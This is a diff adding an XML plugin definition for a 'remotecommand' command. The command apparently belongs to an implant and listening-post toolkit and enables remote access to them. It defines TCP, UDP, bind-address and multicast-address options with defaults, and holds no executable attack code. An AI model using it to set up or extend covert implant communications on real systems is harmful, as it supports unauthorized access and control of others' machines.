@@ -1,0 +1,38 @@
+﻿<?xml version='1.0'?>
+
+<Plugin id="31050">
+
+	<Command id="16" name="remotecommand">
+  
+		<Help>The status report plugin allows a remote program to communicate with the lp.</Help>
+		<Help>This enables remote access to the lp and implant.</Help>
+		
+		<Input optionprefix="-">
+			<Option name="tcp" optional="true">
+				<Help>This is the TCP port</Help>
+				<Argument name="port" data="tcp" />
+			</Option>
+			<Option name="udp" optional="true">
+				<Help>This is the UDP port</Help>
+				<Argument name="port" data="udp" />
+			</Option>
+			<Option name="bind" optional="true">
+				<Help>This is the network address to bind to</Help>
+				<Argument name="bindAddress" data="bindAddress" />
+			</Option>
+			<Option name="address" optional="true">
+				<Help>This is the mulitcast address to bind the listening port to</Help>
+				<Argument name="multicastAddress" data="multicastAddress" />
+			</Option>
+		</Input>
+
+		<Output>
+			<Data name="tcp" type="int16_t" default="0" />
+			<Data name="udp" type="int16_t" default="1000" />
+			<Data name="bindAddress" type="ipv4addr" default="0.0.0.0" />
+			<Data name="multicastAddress" type="ipv4addr" default="225.7.7.7" />
+		</Output>
+		
+	</Command>
+	
+</Plugin>
